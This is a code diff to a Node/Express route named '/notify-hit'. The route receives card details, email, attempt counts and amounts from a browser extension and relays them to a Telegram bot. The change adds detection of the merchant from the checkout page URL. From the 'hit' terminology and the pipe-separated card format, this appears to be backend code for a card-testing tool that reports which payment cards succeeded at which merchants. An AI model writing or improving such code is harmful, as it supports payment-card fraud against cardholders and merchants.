@@ -123,7 +123,7 @@ router.post('/notify-hit', async (req, res) => {
     console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
     // Don't reject, just log warning
   }
-  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec } = req.body || {};
+  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url } = req.body || {};
   // success_url is no longer sent by extension, so we can remove it from processing
   const tgId = String(tg_id || '').trim();
 
@@ -135,7 +135,8 @@ router.post('/notify-hit', async (req, res) => {
     attempts: attempts || 'NO_ATTEMPTS',
     amount: amount || 'NO_AMOUNT_DATA',
     email: email || 'NO_EMAIL_DATA',
-    time_sec: time_sec || 'NO_TIME'
+    time_sec: time_sec || 'NO_TIME',
+    current_url: current_url || merchant_url || 'NO_URL'
   });
   console.log('[HIT_NOTIFICATION] Raw request body:', req.body);
 
@@ -156,6 +157,20 @@ router.post('/notify-hit', async (req, res) => {
   let businessUrl = '—';
   let fullCheckoutUrl = '—';
 
+  // Extract merchant name from current URL if provided
+  let merchantName = 'Extension Hit'; // Default fallback
+  const pageUrl = current_url || merchant_url;
+  if (pageUrl && typeof pageUrl === 'string' && pageUrl.trim()) {
+    try {
+      // Use the same detectMerchant function for consistency
+      merchantName = detectMerchant(pageUrl);
+      console.log('[HIT_NOTIFICATION] Detected merchant from URL:', merchantName, 'from:', pageUrl);
+    } catch (error) {
+      console.error('[HIT_NOTIFICATION] Error detecting merchant from URL:', error);
+      merchantName = 'Extension Hit';
+    }
+  }
+
   // success_url is no longer sent by extension - simplified processing
   console.log('[Telegram] success_url removed from extension payload');
   const cardDisplay = (card && card.trim()) ? card.replace(/\|/g, ' | ') : '—';
@@ -169,7 +184,7 @@ router.post('/notify-hit', async (req, res) => {
     `─────────────────\n\n` +
     `Card :- ${cardDisplay}\n` +
     `Email :- ${emailDisplay}\n` +
-    `Merchant :- Extension Hit\n` +
+    `Merchant :- ${merchantName}\n` +
     `Attempt :- ${attempts ?? '—'}\n` +
     `Amount :- ${amtFormatted}\n` +
     `Time :- ${timeDisplay}\n\n` +
@@ -200,7 +215,7 @@ router.post('/notify-hit', async (req, res) => {
       amount: amtFormatted === 'Free Trial' ? '0.00' : amtFormatted.replace('₹', '').replace(/[^\d.]/g, ''),
       attempts: attempts || 1,
       timeTaken: timeDisplay,
-      merchant: 'Extension Hit' // Could be enhanced to detect actual merchant
+      merchant: merchantName // Use extracted merchant name
     };
 
     try {
